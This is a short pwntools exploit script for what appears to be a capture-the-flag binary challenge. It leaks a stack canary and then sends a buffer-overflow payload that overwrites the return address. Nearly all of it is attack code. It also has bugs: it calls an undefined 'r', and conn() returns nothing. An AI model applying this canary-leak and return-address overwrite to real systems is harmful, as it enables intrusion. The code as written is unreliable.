#!/usr/bin/env python3

from pwn import *

exe = ELF("binary")
#libc = ELF("libc-2.31.so")
#ld = ELF("./ld-2.31.so")


context(arch = 'amd64', os = 'linux')
context.binary = exe


def conn():
    p = process("./binary")


def main():
    #p = conn()
    p = gdb.debug("./binary", """
    b *0x4012E4
    b *0x401256
    """)
    context.log_level="debug"
    context.arch = "amd64"

    control_rip = 0x4013c3
    #leak canary
    p.sendlineafter("> ",b'2')
    p.sendlineafter("How long is your username: ",str(32))
    p.sendlineafter("Username: ",b'a' * 16)

    canary = p.recv(0x3b)
    canary = u64(p.recv(0x7).rjust(8,b'\x00'))
    success("canary: " + hex(canary))

    #leak bss section
    p.sendlineafter("> ",b'1')
    p.sendlineafter("Username: ",b'a' * 16)
    payload = b'a' * 0x18 + p64(canary) + b'b' *0x8 + p64(control_rip)
    p.sendlineafter("Password: ",payload)
    #pause()

    r.interactive()


if __name__ == "__main__":
    main()
